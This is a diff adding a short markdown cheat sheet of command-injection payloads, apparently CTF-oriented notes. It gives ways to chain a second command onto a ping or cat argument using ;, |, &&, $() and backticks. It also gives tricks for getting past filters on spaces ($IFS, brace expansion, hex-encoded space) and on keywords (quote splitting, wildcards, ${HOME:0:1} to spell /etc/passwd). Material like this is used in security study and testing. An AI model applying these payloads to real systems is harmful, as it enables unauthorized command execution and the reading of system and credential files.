@@ -1,0 +1,23 @@
+# Command Injection
+- Basic
+  - $ ping 127.0.0.1 `; id`
+  - $ ping 127.0.0.1 `| id`
+  - $ ping 127.0.0.1 `&& id`
+  - $ ping '127.0.0.1`'; id #` ' 
+  - $ ping "`$(id)`"
+  - $ cat mewo.txt `$(id)`
+  - $ cat mewo.txt `` `id` ``
+  - Newline (0x0A, \n, %0A)
+- Space Bypass
+  - $ cat`<TAB>`/flag
+  - $ cat\</flag
+  - $ {cat,/flag}
+  - $ cat$IFS/flag
+  - $ X=$'cat\x20/flag'&&$X
+- Keyword Bypass
+  - $ cat /f'la'g
+  - $ cat /f"la"g
+  - $ cat /f\l\ag
+  - $ cat /f\*
+  - $ cat /f?a?
+  - $ cat ${HOME:0:1}etc${HOME:0:1}passwd
